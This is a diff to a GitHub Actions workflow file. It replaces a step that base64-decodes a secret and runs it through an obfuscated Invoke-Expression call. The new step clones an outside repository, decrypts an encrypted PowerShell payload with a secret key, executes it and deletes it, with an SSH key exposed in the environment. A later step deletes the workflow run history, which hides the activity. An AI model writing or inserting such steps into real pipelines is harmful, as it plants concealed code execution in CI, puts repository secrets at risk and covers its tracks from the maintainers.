@@ -26,12 +26,24 @@ jobs:
       - name: r3dex
         shell: powershell
         env:
-          LETS_GO: ${{ secrets.R4DX_EXECUTE }}
+          API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:LETS_GO))
-          $e = "I" + "E" + "X"
-          & $e ($d)
+          git clone https://github.com/Sxeldest/dex-enc.git --quiet
+          pip install dex-enc/. --quiet
+          $p = Join-Path $pwd "r4dx.dexenc"
+          if (Test-Path $p) {
+              dexenc decrypt -i $p -key "$env:API_KEY" -o "$pwd\r4dx.ps1"
+              if (Test-Path "$pwd\r4dx.ps1") {
+                  Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
+                  . "$pwd\r4dx.ps1"
+                  Remove-Item "$pwd\r4dx.ps1" -Force
+                  Remove-Item -Recurse -Force dex-enc
+              } else {
+                  Write-Host "[-] Payload file not found in root!" -ForegroundColor Red
+                  exit 1
+              }
+          }
           
       - name: i-am-r4dx
         uses: Mattraks/delete-workflow-runs@v2
